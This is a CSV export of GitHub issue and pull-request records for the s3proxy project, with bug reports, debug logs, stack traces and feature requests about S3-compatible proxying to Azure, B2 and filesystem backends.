gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/244,269777016,MDU6SXNzdWUyNjk3NzcwMTY=,244,"[EMC Atmos] S3Proxy does not list objects that contain ""/""",703870,closed,FALSE,NA,NA,0,2017-10-30T22:37:13Z,2017-10-31T18:43:35Z,2017-10-31T18:43:35Z,CONTRIBUTOR,NA,"After uploading an object `foo/bar`, listing the bucket does not show either `foo/bar` or a faux directory `foo`. Here's the trace level log from S3Proxy: https://gist.github.com/timuralp/7b27c22bfc27ff6461d72b3576b35008",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/244/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/244/comments,https://api.github.com/repos/gaul/s3proxy/issues/244/events,https://github.com/gaul/s3proxy/issues/244,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/243,263543779,MDU6SXNzdWUyNjM1NDM3Nzk=,243,S3Proxy returns Internal Server Error when using invalid Azure metadata keys,703870,open,FALSE,NA,NA,0,2017-10-06T19:09:03Z,2018-02-23T02:23:08Z,NA,CONTRIBUTOR,NA,"When issuing a PUT request with an invalid Azure metadata key (one that contains `-` in this example), S3Proxy returns an Internal Server error (as opposed to the 401 Unauthorized that Azure returns).

Here is the output from s3cmd with debug turned on:
```
s3cmd --no-ssl --debug put dumper.py s3://test/
DEBUG: String 'b'root'' encoded to 'root'
DEBUG: String 'b'root'' encoded to 'root'
DEBUG: attr_header: {'x-amz-meta-s3cmd-attrs': 'atime:1506556690/ctime:1506466030/gid:0/gname:root/md5:39c14bd9c4278fde49d793f180b99a9f/mode:33261/mtime:1506465897/uid:0/uname:root'}
DEBUG: DeUnicodising 'dumper.py' using UTF-8
DEBUG: DeUnicodising 'dumper.py' using UTF-8
DEBUG: DeUnicodising 'dumper.py' using UTF-8
DEBUG: CreateRequest: resource[uri]=/dumper.py
upload: 'dumper.py' -> 's3://test/dumper.py'  [1 of 1]
DEBUG: DeUnicodising 'dumper.py' using UTF-8
DEBUG: Using signature v2
DEBUG: SignHeaders: 'PUT\n\ntext/plain\n\nx-amz-date:Fri, 06 Oct 2017 19:06:52 +0000\nx-amz-meta-s3cmd-attrs:atime:1506556690/ctime:1506466030/gid:0/gname:root/md5:39c14bd9c4278fde49d793f180b99a9f/mode:33261/mtime:1506465897/uid:0/uname:root\nx-amz-storage-class:STANDARD\n/test/dumper.py'
DEBUG: get_hostname(test): localhost:20080
DEBUG: ConnMan.get(): creating new connection: http://localhost:20080
DEBUG: non-proxied HTTPConnection(localhost, 20080)
DEBUG: format_uri(): /test/dumper.py
 434 of 434   100% in    0s    24.26 kB/sDEBUG: ConnMan.put(): connection put back to pool (http://localhost:20080#1)
DEBUG: Response:
{'data': b'<html>\n<head>\n<meta http-equiv=""Content-Type"" content=""text/html'
         b';charset=ISO-8859-1""/>\n<title>Error 500 </title>\n</head>\n<body>\n'
         b'<h2>HTTP ERROR: 500</h2>\n<p>Problem accessing /test/dumper.py. R'
         b'eason:\n<pre>    Server Error</pre></p>\n<hr /><i><small>Powered b'
         b'y Jetty://</small></i>\n</body>\n</html>\n',
 'headers': {'cache-control': 'must-revalidate,no-cache,no-store',
             'content-length': '295',
             'content-type': 'text/html; charset=ISO-8859-1',
             'date': 'Fri, 06 Oct 2017 19:06:52 GMT',
             'server': 'Jetty(9.2.z-SNAPSHOT)'},
 'reason': 'Server Error',
 'size': 434,
 'status': 500}
 434 of 434   100% in    0s  1542.80 B/s  done
DEBUG: S3Error: 500 (Server Error)
DEBUG: HttpHeader: content-length: 295
DEBUG: HttpHeader: server: Jetty(9.2.z-SNAPSHOT)
DEBUG: HttpHeader: etag: 
DEBUG: HttpHeader: cache-control: must-revalidate,no-cache,no-store
DEBUG: HttpHeader: date: Fri, 06 Oct 2017 19:06:52 GMT
DEBUG: HttpHeader: content-type: text/html; charset=ISO-8859-1
ERROR: Error parsing xml: Malformed error XML returned from remote server..  ErrorXML: b'<html>\n<head>\n<meta http-equiv=""Content-Type"" content=""text/html;charset=ISO-8859-1""/>\n<title>Error 500 </title>\n</head>\n<body>\n<h2>HTTP ERROR: 500</h2>\n<p>Problem accessing /test/dumper.py. Reason:\n<pre>    Server Error</pre></p>\n<hr /><i><small>Powered by Jetty://</small></i>\n</body>\n</html>\n'
WARNING: Upload failed: /dumper.py (500 (Server Error)
```

S3Proxy could also have an opt-in feature to work around this Azure limitation by encoding the characters in an accepted format (e.g. Base32 encoding, replacing `=` padding with `_`). However, at the very least it would be great to not get back an Internal Server Error.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/243/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/243/comments,https://api.github.com/repos/gaul/s3proxy/issues/243/events,https://github.com/gaul/s3proxy/issues/243,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/242,257230584,MDU6SXNzdWUyNTcyMzA1ODQ=,242,Strong consistency middleware,848247,open,FALSE,NA,NA,0,2017-09-13T01:28:10Z,2017-09-15T22:56:28Z,NA,OWNER,NA,"[S3Guard](https://blog.cloudera.com/blog/2017/08/introducing-s3guard-s3-consistency-for-apache-hadoop/) adds strong consistency to Amazon S3 by storing all metadata in a DynamoDB database, similar to [S3mper](https://medium.com/netflix-techblog/s3mper-consistency-in-the-cloud-b6a1076aa4f8).  S3Proxy could do something similar via the filesystem or JDBC blobstore.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/242/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/242/comments,https://api.github.com/repos/gaul/s3proxy/issues/242/events,https://github.com/gaul/s3proxy/issues/242,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/241,256534356,MDU6SXNzdWUyNTY1MzQzNTY=,241,What is the purpose of including logback.xml in maven artifact?,10889321,open,FALSE,NA,NA,1,2017-09-10T19:40:26Z,2017-10-31T18:45:43Z,NA,NONE,NA,"Hi Andrew!

First of all thank you for your library!

I have a question which I hope you can answer. What is the purpose of including logback.xml in maven artifact (s3proxy-1.5.3-jar-with-dependencies.jar)?

I am using s3proxy in a spring boot project and logback.xml included in the jar makes it hard for me to either specify log configuration via application.properties, or to add my own logback.xml. Is logback.xml really needed in the distributed jar?

Best regards,
Anatoly ",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/241/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/241/comments,https://api.github.com/repos/gaul/s3proxy/issues/241/events,https://github.com/gaul/s3proxy/issues/241,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/240,254104980,MDU6SXNzdWUyNTQxMDQ5ODA=,240,filesystem backend reports file as both file and directory,1772540,closed,FALSE,NA,NA,1,2017-08-30T19:10:57Z,2018-02-23T02:12:52Z,2018-02-23T02:12:52Z,COLLABORATOR,NA,"if I create a file:

```
$ aws s3 --endpoint http://127.0.0.1:8080/ cp README.md s3://goofys-bench/test_dir/file1
```

and try to head the object with directory blob suffix:

```
$ aws s3api --endpoint http://127.0.0.1:8080/  head-object --bucket goofys-bench --key test_dir/file1/
{
    ""ContentType"": ""application/unknown"", 
    ""LastModified"": ""Wed, 30 Aug 2017 18:55:55 GMT"", 
    ""ContentLength"": 0, 
    ""ETag"": ""\""b773f1b79f5fc28aa2d0d231c714cca7\"""", 
    ""Metadata"": {}
}
[s3proxy] D 08-30 00:23:04.212 S3Proxy-16 o.j.f.s.i.FilesystemStorageStrategyImpl:56 |::] goofys-bench - test_dir/file1/ is a directory
```

I expect to get 404. This is really a jclouds bug. https://github.com/jclouds/jclouds/blob/master/apis/filesystem/src/main/java/org/jclouds/filesystem/strategy/internal/FilesystemStorageStrategyImpl.java#L331 should check that when we head file1/, the resulting file object is actually a directory before returning.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/240/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/240/comments,https://api.github.com/repos/gaul/s3proxy/issues/240/events,https://github.com/gaul/s3proxy/issues/240,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/239,247601335,MDExOlB1bGxSZXF1ZXN0MTMzODY1NTcz,239,Do not escape / when URL encoding,848247,closed,FALSE,NA,NA,1,2017-08-03T06:06:34Z,2017-08-03T17:55:19Z,2017-08-03T17:55:06Z,OWNER,NA,"This allows clients to list pseudo-directories with slashes in them.
References kahing/goofys#213.",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/239/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/239/comments,https://api.github.com/repos/gaul/s3proxy/issues/239/events,https://github.com/gaul/s3proxy/pull/239,https://api.github.com/repos/gaul/s3proxy/pulls/239
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/238,247252036,MDExOlB1bGxSZXF1ZXN0MTMzNjA4NTk1,238,Emit InvalidArgument on CopyPart invalid range,848247,closed,FALSE,NA,NA,1,2017-08-02T02:03:55Z,2017-08-07T06:30:50Z,2017-08-07T06:25:54Z,OWNER,NA,References kahing/goofys#212.,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/238/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/238/comments,https://api.github.com/repos/gaul/s3proxy/issues/238/events,https://github.com/gaul/s3proxy/pull/238,https://api.github.com/repos/gaul/s3proxy/pulls/238
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/237,245261910,MDU6SXNzdWUyNDUyNjE5MTA=,237,Content-Type charset,848247,closed,FALSE,NA,NA,1,2017-07-25T01:44:00Z,2019-01-04T05:27:18Z,2019-01-04T05:27:18Z,OWNER,NA,"S3Proxy responses include a charset in their Content-Type unlike Amazon S3:

```
application/xml; charset=UTF-8
```

Further some responses inconsistently return:

```
application/xml; charset=ISO-8859-1
```",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/237/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/237/comments,https://api.github.com/repos/gaul/s3proxy/issues/237/events,https://github.com/gaul/s3proxy/issues/237,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/236,244605700,MDU6SXNzdWUyNDQ2MDU3MDA=,236,Unauthorized GET request is able to list all buckets,30337509,closed,FALSE,NA,NA,0,2017-07-21T08:55:10Z,2017-07-22T23:11:43Z,2017-07-22T23:11:43Z,NONE,NA,"Hi,
I am running the s3proxy locally with `s3proxy.authorization=aws-v2-or-v4`. When I do a GET call from my browser (ie with no authorization header), it returns me the list of buckets in my account. Is this expected behavior?
According to me an unauthorized call should result in AccessDenied.

I did a bit of digging and found that this [line of code](https://github.com/andrewgaul/s3proxy/blob/master/src/main/java/org/gaul/s3proxy/S3ProxyHandler.java#L304) is getting called which intern calls `doHandleAnonymous`, which lists the buckets.

Any clarification will be much appreciated.
Thanks,
Prakash",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/236/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/236/comments,https://api.github.com/repos/gaul/s3proxy/issues/236/events,https://github.com/gaul/s3proxy/issues/236,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/235,243208915,MDU6SXNzdWUyNDMyMDg5MTU=,235,Image manipulation middleware,848247,closed,FALSE,NA,NA,1,2017-07-16T00:32:17Z,2018-02-10T20:44:31Z,2018-02-10T20:44:31Z,OWNER,NA,"Alibaba OSS offers was to manipulate images returned to clients, including resizing:

https://news.ycombinator.com/item?id=14767484",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/235/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/235/comments,https://api.github.com/repos/gaul/s3proxy/issues/235/events,https://github.com/gaul/s3proxy/issues/235,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/234,239373111,MDU6SXNzdWUyMzkzNzMxMTE=,234,support object storage class,1772540,closed,FALSE,NA,NA,5,2017-06-29T05:56:50Z,2018-02-22T08:34:27Z,2018-02-22T08:34:27Z,COLLABORATOR,NA,currently s3proxy allows `x-amz-storage-class` but ignores it and subsequent HEAD does not return the storage class. Instead the value should be propagated.,NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/234/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/234/comments,https://api.github.com/repos/gaul/s3proxy/issues/234/events,https://github.com/gaul/s3proxy/issues/234,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/233,237153541,MDExOlB1bGxSZXF1ZXN0MTI2NDkxMDI2,233,S3Proxy Code refactoring POC,28896513,closed,FALSE,NA,NA,4,2017-06-20T09:51:51Z,2019-09-21T15:24:55Z,2018-11-04T20:53:09Z,CONTRIBUTOR,NA,Signed-off-by: Chaithanya Ganta <ganta@adobe.com>,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/233/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/233/comments,https://api.github.com/repos/gaul/s3proxy/issues/233/events,https://github.com/gaul/s3proxy/pull/233,https://api.github.com/repos/gaul/s3proxy/pulls/233
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/232,235138853,MDExOlB1bGxSZXF1ZXN0MTI1MDY5OTAx,232,Moving signature creation logic to a seperate class,28896513,closed,FALSE,NA,NA,3,2017-06-12T06:49:54Z,2017-07-07T16:24:04Z,2017-07-07T16:05:15Z,CONTRIBUTOR,NA,"Signed-off-by: Chaithanya Ganta <ganta@adobe.com>

As part of fixing #169, moving signature creation logic to AwsSignature class. ",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/232/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/232/comments,https://api.github.com/repos/gaul/s3proxy/issues/232/events,https://github.com/gaul/s3proxy/pull/232,https://api.github.com/repos/gaul/s3proxy/pulls/232
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/231,234072289,MDU6SXNzdWUyMzQwNzIyODk=,231,Does this support China Azure storage？,20704268,open,FALSE,NA,NA,4,2017-06-07T02:07:23Z,2019-02-09T21:29:23Z,NA,NONE,NA,"china azure storage has different endpoint, such as EndpointSuffix=core.chinacloudapi.cn. in common, we need to set EndpointSuffix, so that the request can point to china azure storage.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/231/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/231/comments,https://api.github.com/repos/gaul/s3proxy/issues/231/events,https://github.com/gaul/s3proxy/issues/231,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/230,233896525,MDExOlB1bGxSZXF1ZXN0MTI0MTk0MDM5,230,Emit proper S3 url/location in multipart upload response,28896513,closed,FALSE,NA,NA,0,2017-06-06T13:44:20Z,2017-06-07T03:10:39Z,2017-06-07T03:10:28Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/230/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/230/comments,https://api.github.com/repos/gaul/s3proxy/issues/230/events,https://github.com/gaul/s3proxy/pull/230,https://api.github.com/repos/gaul/s3proxy/pulls/230
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/229,233354261,MDU6SXNzdWUyMzMzNTQyNjE=,229,endpoint.getHost() is null for /b2api/v1/b2_list_buckets,458591,closed,FALSE,NA,NA,4,2017-06-03T07:58:35Z,2017-07-12T21:14:35Z,2017-07-09T02:46:24Z,NONE,NA,"I'm experiencing issues setting s3proxy with an underlying Backblaze B2 storage for an Arq backup.

Whenever I use an URL like `http://server/bucket_name`, the server logs the following exception:

```
[s3proxy] W 06-03 07:53:37.993 S3Proxy-11 o.e.jetty.server.HttpChannel:396 |::] /<bucket_name>/
com.google.common.util.concurrent.UncheckedExecutionException: java.lang.IllegalArgumentException: endpoint.getHost() is null for /b2api/v1/b2_list_buckets
        at com.google.common.cache.LocalCache$Segment.get(LocalCache.java:2201)
        at com.google.common.cache.LocalCache.get(LocalCache.java:3934)
        at com.google.common.cache.LocalCache.getOrLoad(LocalCache.java:3938)
        at com.google.common.cache.LocalCache$LocalLoadingCache.get(LocalCache.java:4821)
        at com.google.common.cache.LocalCache$LocalLoadingCache.getUnchecked(LocalCache.java:4827)
        at org.jclouds.b2.blobstore.B2BlobStore.getBucket(B2BlobStore.java:448)
        at org.jclouds.b2.blobstore.B2BlobStore.list(B2BlobStore.java:192)
        at sun.reflect.GeneratedMethodAccessor5.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:606)
        at com.google.inject.internal.DelegatingInvocationHandler.invoke(DelegatingInvocationHandler.java:37)
        at com.sun.proxy.$Proxy42.list(Unknown Source)
        at org.gaul.s3proxy.S3ProxyHandler.handleBlobList(S3ProxyHandler.java:1254)
        at org.gaul.s3proxy.S3ProxyHandler.doHandle(S3ProxyHandler.java:603)
        at org.gaul.s3proxy.S3ProxyHandlerJetty.handle(S3ProxyHandlerJetty.java:70)
        at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97)
        at org.eclipse.jetty.server.Server.handle(Server.java:499)
        at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:311)
        at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:258)
        at org.eclipse.jetty.io.AbstractConnection$2.run(AbstractConnection.java:544)
        at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:635)
        at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:555)
        at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IllegalArgumentException: endpoint.getHost() is null for /b2api/v1/b2_list_buckets
        at com.google.common.base.Preconditions.checkArgument(Preconditions.java:148)
        at org.jclouds.http.HttpRequest.<init>(HttpRequest.java:245)
        at org.jclouds.rest.internal.GeneratedHttpRequest.<init>(GeneratedHttpRequest.java:83)
        at org.jclouds.rest.internal.GeneratedHttpRequest$Builder.build(GeneratedHttpRequest.java:63)
        at org.jclouds.rest.internal.RestAnnotationProcessor.apply(RestAnnotationProcessor.java:337)
        at org.jclouds.rest.internal.RestAnnotationProcessor.apply(RestAnnotationProcessor.java:137)
        at org.jclouds.rest.internal.InvokeHttpMethod.toCommand(InvokeHttpMethod.java:188)
        at org.jclouds.rest.internal.InvokeHttpMethod.invoke(InvokeHttpMethod.java:84)
        at org.jclouds.rest.internal.InvokeHttpMethod.apply(InvokeHttpMethod.java:73)
        at org.jclouds.rest.internal.InvokeHttpMethod.apply(InvokeHttpMethod.java:44)
        at org.jclouds.reflect.FunctionalReflection$FunctionalInvocationHandler.handleInvocation(FunctionalReflection.java:117)
        at com.google.common.reflect.AbstractInvocationHandler.invoke(AbstractInvocationHandler.java:87)
        at com.sun.proxy.$Proxy44.listBuckets(Unknown Source)
        at org.jclouds.b2.blobstore.B2BlobStore$1.load(B2BlobStore.java:109)
        at org.jclouds.b2.blobstore.B2BlobStore$1.load(B2BlobStore.java:106)
        at com.google.common.cache.LocalCache$LoadingValueReference.loadFuture(LocalCache.java:3524)
        at com.google.common.cache.LocalCache$Segment.loadSync(LocalCache.java:2317)
        at com.google.common.cache.LocalCache$Segment.lockedGetOrLoad(LocalCache.java:2280)
        at com.google.common.cache.LocalCache$Segment.get(LocalCache.java:2195)
        ... 22 common frames omitted
```

I've started s3proxy using the Docker build with the following arguments:

```
docker run --publish 80:80 --env S3PROXY_AUTHORIZATION=none --env JCLOUDS_PROVIDER=b2 --env JCLOUDS_IDENTITY=<B2_KEY> --env JCLOUDS_CREDENTIAL=<B2_SECRET> andrewgaul/s3proxy
```

Could this be a bug in JCloud?",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/229/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/229/comments,https://api.github.com/repos/gaul/s3proxy/issues/229/events,https://github.com/gaul/s3proxy/issues/229,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/228,232812454,MDExOlB1bGxSZXF1ZXN0MTIzNDUwNjQy,228,Update Dockerfile to use multistage building.,6914822,closed,FALSE,NA,NA,2,2017-06-01T09:07:27Z,2018-02-01T17:12:57Z,2018-02-01T17:11:48Z,CONTRIBUTOR,NA,"This allows developers and users to build their own version of s3proxy fully in Docker without the need of external builders for the s3proxy binary.

This pull depends on features that have been recently released in the [17.05](https://github.com/moby/moby/blob/17.05.x/CHANGELOG.md#builder) version of Docker which may not be preferable for some older build environments.",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/228/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/228/comments,https://api.github.com/repos/gaul/s3proxy/issues/228/events,https://github.com/gaul/s3proxy/pull/228,https://api.github.com/repos/gaul/s3proxy/pulls/228
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/227,231483795,MDU6SXNzdWUyMzE0ODM3OTU=,227,Signed URL Redirect middleware,848247,open,FALSE,NA,NA,0,2017-05-25T23:06:14Z,2017-05-25T23:07:59Z,NA,OWNER,NA,"S3Proxy could redirect clients to the storage backend via HTTP 307 with a signed URL via a middleware.  This would allow S3Proxy to sit out of path of the data, potentially improving performance.  This would be primarily useful when clients do not care about various metadata which have different formats.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/227/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/227/comments,https://api.github.com/repos/gaul/s3proxy/issues/227/events,https://github.com/gaul/s3proxy/issues/227,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/226,231215097,MDU6SXNzdWUyMzEyMTUwOTc=,226,uppercase letters bucket name support (to mock ceph radosgw s3 API),807372,closed,FALSE,NA,NA,0,2017-05-25T01:24:14Z,2017-05-25T05:02:56Z,2017-05-25T05:02:56Z,NONE,NA,I need to migrate ceph radosgw storage with bucket names like 'Photos' so I'll be gratefull if s3proxy support uppercase letters bucket names.,NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/226/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/226/comments,https://api.github.com/repos/gaul/s3proxy/issues/226/events,https://github.com/gaul/s3proxy/issues/226,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/225,231116047,MDExOlB1bGxSZXF1ZXN0MTIyMjgzMjI5,225,Validate bucket name before processing any request,28896513,closed,FALSE,NA,NA,4,2017-05-24T17:32:46Z,2017-06-02T11:48:05Z,2017-06-02T11:47:52Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/225/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/225/comments,https://api.github.com/repos/gaul/s3proxy/issues/225/events,https://github.com/gaul/s3proxy/pull/225,https://api.github.com/repos/gaul/s3proxy/pulls/225
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/224,230794503,MDExOlB1bGxSZXF1ZXN0MTIyMDU5NTM4,224,Upgrade to jackson-dataformat-xml 2.8.8,28896513,closed,FALSE,NA,NA,2,2017-05-23T17:59:57Z,2017-05-23T22:18:28Z,2017-05-23T22:18:28Z,CONTRIBUTOR,NA,"Upgrade to jackson-dataformat-xml 2.8.8
Changelog:
https://github.com/FasterXML/jackson-dataformat-xml/blob/master/release-notes/VERSION
https://github.com/FasterXML/jackson-core/blob/master/release-notes/VERSION",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/224/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/224/comments,https://api.github.com/repos/gaul/s3proxy/issues/224/events,https://github.com/gaul/s3proxy/pull/224,https://api.github.com/repos/gaul/s3proxy/pulls/224
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/223,228267201,MDU6SXNzdWUyMjgyNjcyMDE=,223,Failure to use Azure blob storage using S3Proxy:  Invalid header x-ms-version reported by Azure,15356079,closed,FALSE,NA,NA,5,2017-05-12T11:43:01Z,2017-05-15T15:58:40Z,2017-05-15T15:58:40Z,NONE,NA,"I am trying to use S3proxy to connect with Azure.  However requests are failing with error code 400, reason being invalid header x-ms-version.   
This is the header added by jclouds itself.  Any idea what's going on here ?  
Is there some config setting that I am missing or is it jclouds issue ?

Below are some snippet from debug traces -
Thanks For your help.

```
17:01:50.806 [S3Proxy-19 - /] DEBUG org.jclouds.http.internal.JavaUrlHttpCommandExecutorService - Sending request 1165589104: GET https://xxxxxxx.blob.core.windows.net/?comp=list&include=metadata HTTP/1.1
17:01:50.807 [S3Proxy-19 - /] DEBUG jclouds.headers - >> GET https://testfkdr.blob.core.windows.net/?comp=list&include=metadata HTTP/1.1
17:01:50.807 [S3Proxy-19 - /] DEBUG jclouds.headers - >> x-ms-version: 2013-08-15
17:01:50.807 [S3Proxy-19 - /] DEBUG jclouds.headers - >> Date: Fri, 12 May 2017 11:31:50 GMT
17:01:50.807 [S3Proxy-19 - /] DEBUG jclouds.headers - >> Authorization: SharedKeyLite xxxxxxx:rmd323P/XcAYb9hp2oJgs9DexnOVGQXwXrL7+iPH7Tk=
17:01:51.074 [S3Proxy-19 - /] DEBUG org.jclouds.http.internal.JavaUrlHttpCommandExecutorService - Receiving response 1165589104: HTTP/1.1 400 The value for one of the HTTP headers is not in the correct format.
17:01:51.074 [S3Proxy-19 - /] DEBUG jclouds.headers - << HTTP/1.1 400 The value for one of the HTTP headers is not in the correct format.
17:01:51.075 [S3Proxy-19 - /] DEBUG jclouds.headers - << Server: Microsoft-HTTPAPI/2.0
17:01:51.075 [S3Proxy-19 - /] DEBUG jclouds.headers - << x-ms-request-id: a5f6d1a6-0001-0004-7813-cbff98000000
17:01:51.075 [S3Proxy-19 - /] DEBUG jclouds.headers - << Date: Fri, 12 May 2017 11:31:50 GMT
17:01:51.075 [S3Proxy-19 - /] DEBUG jclouds.headers - << Content-Type: application/xml
17:01:51.075 [S3Proxy-19 - /] DEBUG jclouds.headers - << Content-Length: 328
17:01:51.080 [S3Proxy-19 - /] DEBUG jclouds.wire - << ""[0xef][0xbb][0xbf]<?xml version=""1.0"" encoding=""utf-8""?><Error><Code>InvalidHeaderValue</Code><Message>The value for one of the HTTP headers is not in the correct format.[\n]""
17:01:51.080 [S3Proxy-19 - /] DEBUG jclouds.wire - << ""RequestId:a5f6d1a6-0001-0004-7813-cbff98000000[\n]""
17:01:51.080 [S3Proxy-19 - /] DEBUG jclouds.wire - << ""Time:2017-05-12T11:31:51.4034283Z</Message><HeaderName>x-ms-version</HeaderName><HeaderValue>2013-08-15</HeaderValue></Error>""
```",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/223/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/223/comments,https://api.github.com/repos/gaul/s3proxy/issues/223/events,https://github.com/gaul/s3proxy/issues/223,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/222,227866691,MDExOlB1bGxSZXF1ZXN0MTIwMDE4NzA2,222,Return error when no error response,116492,closed,FALSE,NA,NA,8,2017-05-11T03:10:18Z,2017-05-12T19:33:45Z,2017-05-12T19:33:41Z,CONTRIBUTOR,NA,"This avoids silent failures on blob PUTs, as seen when proxying B2.

When the server closes the connection (timeouts on slow uploads, or keep-alive connections too old), causing an `IOException` (sorry, don't have the stack trace anymore) before the upload has finished, the error was not caught, making the client think that the upload went through.

502 seems to be an appropriate code for clients to go ahead and retry as expected - fixed the backup application I'm using.",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/222/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/222/comments,https://api.github.com/repos/gaul/s3proxy/issues/222/events,https://github.com/gaul/s3proxy/pull/222,https://api.github.com/repos/gaul/s3proxy/pulls/222
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/221,226728963,MDExOlB1bGxSZXF1ZXN0MTE5MjgyOTYz,221,Redirect stderr to logger if non-interactive,848247,closed,FALSE,NA,NA,2,2017-05-06T01:52:55Z,2017-05-08T18:34:02Z,2017-05-08T18:33:13Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/221/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/221/comments,https://api.github.com/repos/gaul/s3proxy/issues/221/events,https://github.com/gaul/s3proxy/pull/221,https://api.github.com/repos/gaul/s3proxy/pulls/221
